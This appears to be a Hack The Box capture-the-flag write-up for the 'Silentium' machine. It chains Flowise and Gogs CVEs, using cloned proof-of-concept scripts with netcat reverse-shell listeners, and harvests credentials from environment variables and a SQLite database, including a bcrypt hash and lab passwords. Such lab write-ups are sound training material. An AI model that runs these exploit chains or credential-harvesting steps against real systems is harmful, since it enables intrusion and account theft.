# HTB Write-Up: Silentium

| Field      | Details      |
|------------|--------------|
| Platform   | Hack The Box |
| Difficulty | Medium       |
| OS         | Linux        |
| Author     | shreekara    |
| Date       | May 30, 2026 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Subdomain Discovery & Flowise Fingerprinting](#2-enumeration--subdomain-discovery--flowise-fingerprinting)
3. [Initial Access — CVE-2025-58434 & CVE-2025-59528 (Flowise RCE)](#3-initial-access--cve-2025-58434--cve-2025-59528-flowise-rce)
4. [Lateral Movement — Credential Extraction & SSH Access](#4-lateral-movement--credential-extraction--ssh-access)
5. [Privilege Escalation — Gogs CVE-2025-8110 (RCE as Root)](#5-privilege-escalation--gogs-cve-2025-8110-rce-as-root)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

### Task 1 — Deploy the machine

🎯 Target IP: `10.129.6.254`

```bash
mkdir -p ~/Downloads/htb/machine/silentium
cd ~/Downloads/htb/machine/silentium
```

### Task 2 — Nmap Scan

```bash
sudo nmap -sV -sC -O -T4 10.129.6.254
```

<img width="1196" height="575" alt="Screenshot 2026-05-30 235704" src="https://github.com/user-attachments/assets/Screenshot_2026-05-30_235704.png" />

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
```

Two open ports — SSH on 22 and nginx on 80 redirecting to `silentium.htb`.
Added it to `/etc/hosts` straight away:

```bash
echo "10.129.6.254 silentium.htb" | sudo tee -a /etc/hosts
```
<img width="1913" height="1008" alt="image" src="https://github.com/user-attachments/assets/c3aeae3a-c0a0-43cc-a6c6-b5c1ad996e00" />

---

## 2. Enumeration — Subdomain Discovery & Flowise Fingerprinting

### 2.1 — Web Application

Visiting `http://silentium.htb` shows a basic financial institution landing
page. The Institutional Leadership section leaks some names — potential
usernames to keep in mind.

Nothing else stood out, so moved on to directory enumeration:

```bash
gobuster dir -u http://silentium.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Hit a soft 404 issue — server returns 200 for everything with a body size
of 8753. Excluded that:

```bash
gobuster dir -u http://silentium.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  --exclude-length 8753
```

Nothing useful. Pivoted to subdomain fuzzing. First checked the default
response size for a non-existent subdomain:

```bash
curl -I -H "Host: this-does-not-exist.silentium.htb" http://silentium.htb
```

Default size is 178. Used that to filter ffuf:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://silentium.htb \
  -H "Host: FUZZ.silentium.htb" \
  -fs 178
```

Found one subdomain: `staging`. Added it to `/etc/hosts` and visited it.

### 2.2 — staging.silentium.htb

The subdomain shows a login form with no registration option. Tested the
forgot password feature — it responds differently based on whether the
email exists or not, which means we can enumerate valid users.

Tried the names from the leadership section with `@silentium.htb` — 
`ben@silentium.htb` came back as a valid account.

### 2.3 — Identifying Flowise

Ran a curl request against the login endpoint to grab response headers:

```bash
curl -s -X POST http://staging.silentium.htb/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"wrongpassword"}' -v
```

The response HTML title revealed **Flowise** — an open source AI agent
builder. Grabbed the version from the API:

```bash
curl http://staging.silentium.htb/api/v1/version
```

**Flowise 3.0.5** — time to look for vulnerabilities.

---

## 3. Initial Access — CVE-2025-58434 & CVE-2025-59528 (Flowise RCE)

### 3.1 — Vulnerability Background

Flowise 3.0.5 is affected by two CVEs that chain together nicely:

- **CVE-2025-58434** — Unauthenticated account takeover
- **CVE-2025-59528** — Authenticated RCE via malicious JavaScript injection
  into the `mcpserverconfig` parameter of the CustomMCP node

CVE-2025-58434 gives us auth, CVE-2025-59528 gives us a shell.

### 3.2 — Exploitation

Used this PoC that chains both:

```bash
git clone https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC.git
cd CVE-2025-58434-AND-59528-POC/
```

Started a listener:

```bash
nc -lvnp 4444
```

Ran the exploit:

```bash
python3 main.py -u http://staging.silentium.htb \
  -e ben@silentium.htb \
  --lhost 10.10.16.194 \
  --lport 4444
```

Shell landed. We're in as `node`.

---

## 4. Lateral Movement — Credential Extraction & SSH Access

### 4.1 — Exploring the Filesystem

Checked the home directories — nothing in `/home/node`. Found an
interesting directory at the root level:

```bash
ls /root/.flowise
```

Contains `database.sqlite`, `encryption.key`, and an empty `uploads/`
directory. Pulled the SQLite database:

```bash
sqlite3 /root/.flowise/database.sqlite ".tables"
```

Grabbed the users table — found ben's bcrypt hash and an API key.
Kicked off hashcat on the hash while continuing enumeration:

```bash
echo '$2a$05$pXSTEp6Tcy1xScw3YtFOUe.6RZlznkh68TEtOVZpEO1Us0CRSVTXa' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

### 4.2 — Environment Variables

While hashcat ran, checked the environment variables in the shell:

```bash
env
```

Two passwords jumped out immediately:
<img width="452" height="698" alt="Screenshot 2026-05-31 030024" src="https://github.com/user-attachments/assets/6e9539e4-6a38-49cc-afa2-07026d0b2efc" />

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
```

Tried `F1l3_d0ck3r` for SSH — failed. Tried it on the staging login — also
failed. Moved on to `SMTP_PASSWORD`. Nmap didn't show SMTP externally so
this looked like a reused SSH credential.

### 4.3 — SSH as ben

```bash
ssh ben@10.129.6.254
# Password: r04D!!_R4ge
```

Logged in. User flag at `/home/ben/user.txt`.

> 🚩 **user.txt** — `REDACTED`

---

## 5. Privilege Escalation — Gogs CVE-2025-8110 (RCE as Root)

### 5.1 — Internal Port Enumeration

```bash
ss -tlnp
```

Several internal ports came back. Curled the unknown ones to identify them:

```bash
curl http://127.0.0.1:3001
curl http://127.0.0.1:8025
```

Port 3001 returned HTML with Gogs metadata — a self-hosted Git service.
The `og:url` tag in the response revealed the internal hostname:

```
http://staging-v2-code.dev.silentium.htb:3001/
```

Port 8025 is Mailhog webUI — nothing useful there after forwarding it.

### 5.2 — Accessing Gogs

Forwarded port 3001 via SSH tunnel:

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.6.254
```

Visited `http://127.0.0.1:3001`. Ben is listed as a user but none of the
known passwords worked. Forgot password is disabled. Registered a dummy
account to continue investigating — no public repos visible anywhere.

### 5.3 — Gogs Config & Version

Found the config file:

```bash
find / -name "app.ini" 2>/dev/null
cat /opt/gogs/gogs/custom/conf/app.ini
```

Two critical findings:

```
RUN_USER = root
SECRET_KEY = sdsrcxSm0iC7wDO
```

Gogs is running as root. Any RCE through it means root directly.

Checked the version:

```bash
/opt/gogs/gogs/gogs --version
```

**Gogs 0.13.3** — vulnerable to CVE-2025-8110.

### 5.4 — CVE-2025-8110 (Gogs RCE)

CVE-2025-8110 works by creating a repo with a malicious symlink pointing
to `.git/config`, overwriting it via the API with a malicious `sshCommand`
payload. When Gogs processes the repo over SSH it executes the command.

Used a modified PoC that skips registration (captcha is enabled) and uses
the existing dummy account instead:

```bash
git clone <github_link>
cd CVE-2025-8110-silentium-htb

# Required for the commit step
git config --global user.email "test@test.com"
git config --global user.name "test"
```

Started a listener:

```bash
nc -lvnp 9001
```

Ran the exploit:

```bash
python3 CVE-2025-8110.py \
  -u http://127.0.0.1:3001 \
  -lh 10.10.16.194 \
  -lp 9001 \
  -un <dummy_username> \
  -pw <dummy_password>
```

Shell came back as root.

```bash
cat /root/root.txt
```
<img width="884" height="371" alt="Screenshot 2026-05-31 120006" src="https://github.com/user-attachments/assets/82ac9f09-50ad-4265-a09d-3080f7cd93e5" />

> 🚩 **root.txt** — `REDACTED`

---

## 6. Summary

| Phase                | Technique                                          | Result                        |
|----------------------|----------------------------------------------------|-------------------------------|
| Recon                | Nmap `-sV -sC`                                     | Ports 22, 80 — nginx → silentium.htb |
| Enumeration          | ffuf subdomain fuzzing                             | `staging.silentium.htb` found |
| Fingerprinting       | curl response headers + `/api/v1/version`          | Flowise 3.0.5 identified      |
| Initial Access       | CVE-2025-58434 + CVE-2025-59528 chained            | Shell as `node`               |
| Credential Extraction| SQLite DB + `env` dump                             | `SMTP_PASSWORD=r04D!!_R4ge`   |
| Lateral Movement     | SSH password reuse                                 | Shell as `ben` + user flag    |
| Internal Recon       | `ss -tlnp` + curl internal ports                   | Gogs on 3001, running as root |
| Privilege Escalation | CVE-2025-8110 via SSH tunnel + dummy account       | Root shell + root flag        |

### Key Takeaways

**Subdomain enumeration is worth the extra step.** The main domain looked
like a dead end. Everything interesting was on `staging.silentium.htb`,
which only showed up through fuzzing.

**Verbose error messages enable user enumeration.** The forgot password
feature's different responses for existing vs non-existing emails handed
over a confirmed username for free.

**Environment variables are a goldmine.** The `env` output gave two
plaintext passwords, one of which was reused for SSH. Credentials in
environment variables are easy to overlook but always worth checking.

**Gogs running as root is an instant game over.** Once we had a low-priv
shell and found Gogs internally on port 3001 with `RUN_USER = root` in the
config, the path to root was just a matter of finding the right CVE.

---
